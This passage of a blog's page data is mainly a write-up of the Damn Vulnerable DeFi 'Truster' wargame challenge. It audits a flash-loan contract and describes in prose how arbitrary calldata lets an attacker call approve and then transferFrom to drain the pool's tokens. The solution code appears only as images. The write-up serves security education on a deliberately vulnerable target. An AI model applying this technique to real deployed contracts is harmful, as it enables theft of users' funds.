href=\"#functions\">Functions</a></li>\n<li><a href=\"#the-big-differences-are\">The big differences are:</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#vulnerability\">vulnerability</a></p>\n</li>\n<li>\n<p><a href=\"#solve\">Solve</a></p>\n</li>\n<li>\n<p><a href=\"#next-time-\">next time.. 🚀</a></p>\n</li>\n</ul>\n</div>","excerpt":"Wargame Provider: @tinchoabbate Challenge #4 — Side entrance A surprisingly simple lending pool allows anyone to deposit ETH, and withdraw it at any point in time.\nThis very simple lending pool has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.\nYou must take all ETH from the lending pool. Code Audit SideEntranceLenderPool.sol Dependency The address contract of the openzeppelin library is used as a dependency. State Variable  It is …","frontmatter":{"date":"July 30, 2022","title":"Damn Vulnerable DeFi Wargame Challenge4 — Side entrance Contract Analysis🤔","categories":"Blockchain","author":"Zer0Luck","emoji":"🦊"},"fields":{"slug":"/defi-wargame-4/"}},"next":{"id":"ee647e58-6973-5d73-8247-24dcc7057371","html":"<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAAsTAAALEwEAmpwYAAAChElEQVQoz1XRyU8TYQAF8G/2pQzTTjeYmc7MNzPtdCylFLpQaGmhFNuCUCvWBYFKBTVEIx5cYmJMjImSuMWLF28evOjBqFESoxe9YOKaGBON0YOJR/8BYxAvJu/6e4f3wJWD2xqDWV6w25xhzmVzLpt3RzwdMcEX9XT0CL6oyxt1ebsEX9TtjzndW8Kpyfnzt8aWzumjTaBJltdlYqSGkipKagihkKwhBhJ+qTcA+wMw3Sn3dcoJSU2pRkZUEtHkRP3Ihaljl+zp4wD5y3AaEoyO05BkdIKGBA1xWuOctqQmVSOjGhkFpvXgoKpn9GA2mp5MVZpmfg/AGJ3gIxhpAkLBHCGAKoBQAa4ARASoBDAZIBJKbLRTrEHQEEFEnIY4o7O8BexMrd46OVo+EEvX8rWlsfFWfnyhUG6Wtu7N5XcM5LaXyjOR7iJOQwA6aVpLxUdxWsUoyLQFgR6v1PetlKuLvQP1wlQrNzIzMrU4Up4L2XnNHJDUpBHKOj1dLBe0YKpaWf7y5rsKhwAqck4bSPZwpjqfHGpEExPWYEPWh9PZRjxZdQphgEgACyCoDIDoE5OfHjxZv/fu5dPfy0s3UUqjWBPwSkawSh610O5Ntuslj5TzmoWAOeQXY5TDIBidYAyM0hxC92xrdfXi4xtXX51eud0hpgERAIfmTp04enl6YkXSC267IsJhv1XUrCIvhBnOxCi4MQ8NSdbwy7lYz658tpnqawjuXgcTAz+fvf/14tuHu28Pz56VQ0XeE2e4MMOFSFYnmH9yM5sXco6E0r6723WmX7gO1u+sfX30+sfa5/vXHlp6HuAyTmsYpWH0fxKnIUZBlg9FAvt3ms8XrI81de0PkBR+gd3uy7UAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"truster-contract\"\n        title=\"truster-contract\"\n        src=\"/static/970dda92823702572cc1dd67ebf61200/37523/c3.png\"\n        srcset=\"/static/970dda92823702572cc1dd67ebf61200/e9ff0/c3.png 180w,\n/static/970dda92823702572cc1dd67ebf61200/f21e7/c3.png 360w,\n/static/970dda92823702572cc1dd67ebf61200/37523/c3.png 720w,\n/static/970dda92823702572cc1dd67ebf61200/e996b/c3.png 1050w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>Wargame Provider: @tinchoabbate</strong></p>\n<blockquote>\n<p>Challenge #3 — Truster</p>\n</blockquote>\n<p>More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.\nCurrently the pool has 1 million DVT tokens in balance. And you have nothing.\nBut don’t worry, you might be able to take them all from the pool. In a single transaction.</p>\n<h2 id=\"code-audit\" style=\"position:relative;\"><a href=\"#code-audit\" aria-label=\"code audit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Code Audit</h2>\n<blockquote>\n<p>TrusterLenderPool.sol</p>\n</blockquote>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 111.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAWCAIAAABPIytRAAAACXBIWXMAAAsTAAALEwEAmpwYAAADfUlEQVQ4y23Q227jRBzHcT8IFzTZxoexx/acPB57PD6MT0napIdNSXeBZSUkUMOK3iA17Rtwy1vwkmiSdlsQ0vfSH/3+Y+v+89+D+nVefhmKu1Ht5mq3UHfLcndW/3bZ/3413K/bL6tmtz500d5dtndX7W7d/LL78Kd12T1Ovom8qbAn3Dk25bMTZp8wcJr6s9SdJPYJcybMmVD3kDdl9rex5u+t6/7JdWQU9CHQEehCR0OnhnYVzKpgVgZ2GTpl7FaxWz7nlRhUkZ2P+Qfrenz0PYnCFoU1CprYq6PjF36JQYn9KnYVtIvIMcWuCbkqtMUgb62b8Smbqop1i6ZvMl2mWudtlequaHvVNlmbogoDFblF5D5j7KnQEWN+a93MnyJfMdxz1vF0YLRLkea8T3gv0o5HdRIqEqj4RSKvwMAsz+WttRn39jsewRaG2rwtaCK/Dk4LOCvgTIZ2cbz5qzTYU5Ej5oU5e++cpoj0xG8QqFGkTbBGYYVh9fVU9CoLAgxeGDzfu1POYcfdhqAO4ZbQlrKOohbD6u3gUWJQEF/FR/zdYg8mPA37hPQ0HQhtGeu5nHPeU9ISWMeu/JcEBfVV7Iql2lrbxd47TWOoQ7+MzZQKbRk5pjePfJVHjFyxLLfW7fLRnSaUdEk+JnKe5CMOyv9eC14l8QsWGHxWbq2P54/OCaW4Y9nIRE+Rjp3/e+fzpumIzyuDH8A0oZEmWBOi07BhXhm/YfhlkL6UBAp7B/z9+d6bMg51gXsEVGTL2JWxI5EjkSvxS8STBEgCChYUCTR4VW2tH1YP/mlCY81En7CWEk3DisU1Iw0jTYLqBNcpbThp8rgRUUUPmHhiVW+tH9d7b0pJ1HDeczGkcuBEp6zN1DwVveRNletatkroJtWKahYUHCoCxLreWp8u9mBCGdIJ7xLWMqpT2grSJqhmUWVmmU5gSYGkvmS+TGDBQ0WBuKi31k8Xe/CO0qg2EjeMNjnSIqpJoBhUFCoGS1Ng/lMSKOZLDg2+bLbW58t98C5JcJvlY1aMQg6C6FyOsl5k+aDyrir6phzqoh9Eby4ndRZXLMiu2lvr0/oPb4oRkLGfo8CEQYb8DMMcBxn1BfNFEhwKBYeChxnzs8ihZ+raevj5r1Zcj/nNkG2GbDPmm7k0LeRmUZiWxWapNmeHztVmVW7W1c2qen//8eEfmpsxmr7aVX4AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"TrusterLenderPool\"\n        title=\"TrusterLenderPool\"\n        src=\"/static/a8521907c24e386de6e9b90d41a84094/37523/c3-1.png\"\n        srcset=\"/static/a8521907c24e386de6e9b90d41a84094/e9ff0/c3-1.png 180w,\n/static/a8521907c24e386de6e9b90d41a84094/f21e7/c3-1.png 360w,\n/static/a8521907c24e386de6e9b90d41a84094/37523/c3-1.png 720w,\n/static/a8521907c24e386de6e9b90d41a84094/e996b/c3-1.png 1050w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h3 id=\"dependency\" style=\"position:relative;\"><a href=\"#dependency\" aria-label=\"dependency permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Dependency</h3>\n<ul>\n<li>We are using the Address contract of the openzeppelin library as a dependency.</li>\n</ul>\n<h3 id=\"state-variable\" style=\"position:relative;\"><a href=\"#state-variable\" aria-label=\"state variable permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>State Variable</h3>\n<p><code class=\"language-text\">IERC20 public immutable damnValuableToken</code></p>\n<ul>\n<li>IERC20 standard damnValuableToken used globally in this challenge is used for contract address management.</li>\n</ul>\n<h3 id=\"functions\" style=\"position:relative;\"><a href=\"#functions\" aria-label=\"functions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Functions</h3>\n<p><code class=\"language-text\">constructor(address tokenAddress)</code></p>\n<ul>\n<li>It has the token contract initialization process and instance allocation criteria.</li>\n</ul>\n<p><code class=\"language-text\">function flashLoan(uint256 borrowAmount, address borrower, address target, byte calldata data) external nonReentrant</code></p>\n<ul>\n<li>\n<p>This is the part responsible for the main logic of this contract. Let’s analyze the logic.</p>\n</li>\n<li>\n<p>The local variable <code class=\"language-text\">balanceBefore</code> receives the balance information of this contract by using the balance method of the <code class=\"language-text\">damnValuableToken</code> contract.</p>\n</li>\n</ul>\n<p>✅ The <code class=\"language-text\">balanceBefore</code> value must be greater than or equal to the <code class=\"language-text\">borrowAmount</code> value, and it must be greater than the value you want to borrow from the entire pool.</p>\n<ul>\n<li>Using the <code class=\"language-text\">transfer</code> method of the <code class=\"language-text\">dammValuableToken</code> contract, the parameter <code class=\"language-text\">borrower</code> is transferred as much as the <code class=\"language-text\">borroAmount</code> value.</li>\n<li>If the first condition is passed, you can ask for a quote that unconditionally transfer is possible.</li>\n<li>You can proceed with <code class=\"language-text\">functionCall</code> based on the parameter <code class=\"language-text\">target</code> address value and call it by passing <code class=\"language-text\">bytes calldata data</code> value as a parameter.</li>\n<li>After that, the logic proceeds to finalize the flash loan logic.</li>\n</ul>\n<h2 id=\"vulnerability\" style=\"position:relative;\"><a href=\"#vulnerability\" aria-label=\"vulnerability permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerability</h2>\n<p>The vulnerability in this contract is that external users can construct and call any function they want. If an attacker steals the balance information of the target contract, or the attack vector that can perform a service-level attack such as DOS is universal, it is a very serious condition.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 64.99999999999999%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAAsTAAALEwEAmpwYAAACdUlEQVQoz03Q2W7TQBSAYT8IolEbJ97j8awexzPe4jjO0qZxm7R1U0GFKFsvQNxAI1VcIBLKNa/AY/BoyEVISN/VkX6do6Pc3/6+OPx2NX9Yz3dX892z493zxe56sXtx8v3l6sfN6uFmubtZbl+ttq/Ptm/Ot+8utrf17u351+37X8py/OXgiaO1WHsPd1q4/RSqe0htIW2fOFpga77RJt0W1PYb+j7UD6DZRp09pwzPlOXo3lWFjyc4mNJwBr1hT0tcPXH12NUioEfAiDwzhmaMzBhZDWInnhEeJlfKaXHX7XKWHuFgTMQEOKnTlU5X9jThPgJ6wzMa0BDQFMiSQOOzqFaW5UZXOXBz4A4AyICTONq/Um808f+lKbAlgc4P41pZjTea6kNUuHbiqMLpiqbsPu7UhKeHnhHChvD+lqYgtvR0fhTXyvlkY3Q4ZiVEObBi15CuIYEpgSE9SzYTM4ZWhBxJrAjbEluPscGP0lq5mG4MlRFWkqCkckz7I+ZlLBz5svR5HvhF0J9EchSFec6GAg+wKagjocHnaa3U043eZgjmEKTIS7xeCno5BimGKe7FDCUcJdSWxBLEEdQRxG5iZPDjrFYuZ3dGh1FWADh0UQlRSViJ7RhZEtkRdmPixqj5VojMsLnZEsyRyOSLrFbWhxtTpcwfUb+gfETxwEeZHxQ+H/osp6SgbCz6Q+kPMpwLlAQg4m6EreAkv1TWs0+6iiBMEUoQTpAbYUdikhCaYCA5lBxFIZF9JEQjDJEgdt/TyTxdKR+vf8Z0kdGTjFYZrQasGvAq96uhXxW8MQoWo6Aq+1UZVuOwmohqFp1OZfVh/fkPOC6+/EStYiIAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"flashLoan function\"\n        title=\"flashLoan function\"\n        src=\"/static/f8021872b9d411d8a4b027c58516695d/37523/c3-2.png\"\n        srcset=\"/static/f8021872b9d411d8a4b027c58516695d/e9ff0/c3-2.png 180w,\n/static/f8021872b9d411d8a4b027c58516695d/f21e7/c3-2.png 360w,\n/static/f8021872b9d411d8a4b027c58516695d/37523/c3-2.png 720w,\n/static/f8021872b9d411d8a4b027c58516695d/e996b/c3-2.png 1050w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>When executing the <code class=\"language-text\">target.functionCall(data)</code> line in the current code and manipulating each parameter to a desired value, it is possible to call a specific function and function parameter. However, since the before and after remnants must be the same, it is impossible to abuse the function in the form of stealing the balance value singly.</p>\n<h2 id=\"solve\" style=\"position:relative;\"><a href=\"#solve\" aria-label=\"solve permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>solve</h2>\n<p>An attacker constructs a desired payload and calls functionCall inside the vulnerable <code class=\"language-text\">flashLoan</code> function to steal the balance value of the corresponding token pool. When transferring tokens forcibly, the destination address must be accepted before <code class=\"language-text\">transfer</code> because security is set in the ERC20 <code class=\"language-text\">Approve/Allow</code>Flow method. But this part is easy to fix. By calling <code class=\"language-text\">approve(address, amount)</code> using functionCall, after allowing the amount to be stolen and the address value to be taken, all funds in the pool are stolen by calling the trasferFrom function.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 166.1111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAhCAIAAABWXBxEAAAACXBIWXMAAAsTAAALEwEAmpwYAAAEwElEQVQ4y23S2Y7jNhaAYT1Jkja6bG0kxZ0SLVISSS122bXYnSAzWRAEAwwQdKWD2EHeYG7mOeY5B7KrekuAH777cI6PGD39+L/R/rK1v07m7ca83di52/Zp1zzd+XcP/W/79u3ePd25p3s/9+CfHv2v9+6Xf339n+iuO2dfsiQ1yY1O0nWeaZxVq4V6/QVfvpKrOTG3EPG1VyJZyJuviCb76BD+lMCL9V7JjRBTVW0aOWrSMxjgqoOrFq1aFD9XxG2RtDhp4aru5JvoLpyzpBZ84sQLFgh0xaphSUfSDtzY/MaClYWX0Mqi2KLYFLGFS92KY3TnT+mXJckDKDxEHmYdBC7LfApGCIYStwy0n0qDr1geo3t/ipeaF6NMg8w8yz3O3Lxt0s0bpvOeF2muci6xcKU7eYwewnn5lVRkW9GtpluFJ5kGXgRCJkR2vJhw0sCVgbFBqyuucWLQFT+G8+qV4oknKGAccOFp5njmisIDNEE4ADTwwlWkKXErUaPZWJEBLq+4P68WiseO5K7AvsCepC1POowcROMcnljhStxo2qqiWbNJ0xGutFPH6NCf44XCcQdSV8QtzRyDgcNAgUfA47R5+Z8GpwYnBieWZraIL/g4nONXUmU9JLdV6g3ZuPoQ6kep9oTvJAwADQhPNG9xUl+woemMfXnFCyVSx+MWgD4HPc49Tdsc9QgETQcjt2s+XRlJr804lMfozXiOF5LhXsJA4hblHkJPgKNZh6DH0JHEfCrnyTjWobrgZCEJCARvjNyty32l9iTrcNIg4DBwf5GGZbZILvjr62QSBHIkbYq8Q3lHoJPIYdDhrCWfSpoZmluc6H7G0ym/KQkMDG9KHBBwAHpa9GXhMZyf+ucymyeTK/5mOoFVJVCHE8Niy2MjUkvjulhqvFqTpH5mH6Th2WWyPkbfbE7ZaymJ40UrC68KJ3CPi6GAniFHP595Kbck1aM+Rt9uT9lCEOSx3LXal9yhvMNovjOFHf0baTiwNNWDPsw4fS1JYhHblWxYk4ZmZt720lWyj2VuxPPkQ/SP23ltmlpa9JSOrWo5tJdn9DyQfiovzZOn9SH65xUnFqPASG95w3KD45qmNc3q95J/kEYCS7OPsMS+VlspJsmCEUMtRk0DQa4knmU1y2r+8ivy+oo3M96dstei5mNV7lT9UOpd6O57/yjVLSdjxSbOJsYGJYKmXqJ2/ijQskxv6kP0w/1Z4a5Xt5pORO2Z2JZsaOTESE/JoEhQpKd8Enxo5FDyntFeXbE5RN/tTyRfK+Su745lNb3c+f2qLKvFZVueX3bO6xnnemsO0fe732FSahrWoKuh0zhw0Hx0WCNyI8CcfElBy3N9aw7Rj/sTWEqFXFl4BV2JOgmseLnq5xLOlR/w3QksRUnDmgQFO0GCIKFkg2FBsV5gJ0D9XqpLV7yzFwyXohJDJTdduW3qu/V6r2gw1AvqBXafyRkjK8AF/3R/hktZ8bGWW8t6SQfOxor2VeE4GxUbFLQK2hI9VyGri0bC9b49Rj/cvSsSyYHFwPK8JmlFMk2yiqUVyzSdq9hLPJ8TQJNUTut99MfP/w3lw7g+Dvpx1Idp/dymfm5rnru1czt72NvDrXn495t3/wfs3MBxActFpAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"solve\"\n        title=\"solve\"\n        src=\"/static/a17116aeca6eef7892b9cde00f6078ff/37523/c3-3.png\"\n        srcset=\"/static/a17116aeca6eef7892b9cde00f6078ff/e9ff0/c3-3.png 180w,\n/static/a17116aeca6eef7892b9cde00f6078ff/f21e7/c3-3.png 360w,\n/static/a17116aeca6eef7892b9cde00f6078ff/37523/c3-3.png 720w,\n/static/a17116aeca6eef7892b9cde00f6078ff/e996b/c3-3.png 1050w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"next-time-\" style=\"position:relative;\"><a href=\"#next-time-\" aria-label=\"next time  permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>next time.. 🚀</h2>\n<p>I will continue to post auditing and research on 12 challenge defi Smart Contracts.</p>\n<p>Thank you for the @tinchoabbate that made a good wargame.\n<a href=\"https://www.damnvulnerabledefi.xyz/\">Damn Vunlerable Defi</a></p>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#code-audit\">Code Audit</a></p>\n<ul>\n<li><a href=\"#dependency\">Dependency</a></li>\n<li><a href=\"#state-variable\">State Variable</a></li>\n<li><a href=\"#functions\">Functions</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#vulnerability\">Vulnerability</a></p>\n</li>\n<li>\n<p><a href=\"#solve\">solve</a></p>\n</li>\n<li>\n<p><a href=\"#next-time-\">next time.. 🚀</a></p>\n</li>\n</ul>\n</div>","frontmatter":{"date":"July 29, 2022","title":"Damn Vulnerable DeFi Wargame Challenge3 — Truster Contract Analysis🤔","categories":"Blockchain","author":"Zer0Luck","emoji":"🦊"},"fields":{"slug":"/defi-wargame-3/"}},"prev":{"id":"6c74a43d-f913-5d2e-b8c1-0ad64f03bff7","html":"<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAACh0lEQVQoz2WR3UuTcRTHz7Pn2UvMbc69OB+1kTnNNR1WtlZmNRMzMcllmk2XMxZlUVK6sldCeoOIUAShF8sICYLoMrDLrqKLbgv6N7r7xPNMLeji/M45v9/5fTjfc0TRyhHR0APN7PcN0+4fJKH30V6eoSuUpTOUocl7EK9tI5WuOI2xXipCMco31FO5o5Vw8gCauBDFjqIFEYs1hIiD2tYeTo0vM5F4z1T8A/mGl2Rr55lu+MhEdJFqbwvJLaP0bX1AdNMhEp4MHmcEa0kFonhQVC+iBhGzQ0sA1VlFPD9Oz4150oXnDFxYZKR3ice7f3Et9omWyDA3b3zj/p2f7Kod4Xj1IxQtgCg+DIaiBk0Tg2pClQAibsQaQDx+ssfeMJleIRtdZCr+hYG6p6QLCzz58ZujyRk6gpcR1YNFqyj+N6AmxzgMqDWExaGj2nVzBF25e0y//k6ue4nrO78SLknh0mNkP68wMLaA19KIWH1oNh1zbGuN/Q3KEHGhiB9R/Ijmp+VCgT2pSexSi4gTER+iBJENlYiUFOuMhYiXtcZkDeaq2oF/6CS2VBKrXWfb9nYCvgj10QR10QQl7hrszmpiTW1sDDejVzfhKq2hMb6PqnDchBclm1t2E6kbovXuW9zDgwQD9czNv6AwPcPZ8QK3bj9kcChPLN7G4qtlZuee8fDRrHlv5FNX767LFosWQhQ3dd4jnNj7jkhqHLurivyZK4ycOk9m5Bzp/hy505foOzZKcs9henozdHT2Mzp2kQPtR9nd2o3Vof8jWQ1is4Vx2DejqsZDYHU+nlVfVrT1mXkQKV317mL831IMiGoso5gbZshY8xZr8U61VazmRVNtofU6o8M/13ROJi18q2AAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"sol.png\"\n        title=\"sol.png\"\n        src=\"/static/42c50aa129dde452dfcc4a7375ec7765/37523/sol.png\"\n        srcset=\"/static/42c50aa129dde452dfcc4a7375ec7765/e9ff0/sol.png 180w,\n/static/42c50aa129dde452dfcc4a7375ec7765/f21e7/sol.png 360w,\n/static/42c50aa129dde452dfcc4a7375ec7765/37523/sol.png 720w,\n/static/42c50aa129dde452dfcc4a7375ec7765/302a4/sol.png 1080w,\n/static/42c50aa129dde452dfcc4a7375ec7765/07a9c/sol.png 1440w,\n/static/42c50aa129dde452dfcc4a7375ec7765/29114/sol.png 1920w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"transactions\" style=\"position:relative;\"><a href=\"#transactions\" aria-label=\"transactions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Transactions</h2>\n<ul>\n<li>A client can call a program by submitting a transaction to the cluster.</li>\n<li>A single transaction can contain multiple instructions, each targeting its own program.</li>\n<li>Can contain multiple commands, each targeting its own program.</li>\n<li>When a transaction is submitted, Solana Runtime commands are processed atomically in sequence.</li>\n<li>If any part of the command fails, the entire transaction fails.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">- program_id of the target program\n- all arrays of read and write accounts\n- an instruction_data byte array specific to the target program</code></pre></div>\n<ul>\n<li>Multiple commands can be bundled into a single transaction.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">- any array accounts you want to read or write to\n- one or more instructions\n- recently updated blockhash\n- One or more signatures</code></pre></div>\n<ul>\n<li>Commands are processed atomically in order</li>\n<li>If any part of the command fails, the entire transaction fails.</li>\n<li>Transactions are limited to 1232 bytes</li>\n<li>solana runtime needs both instruction and transaction to 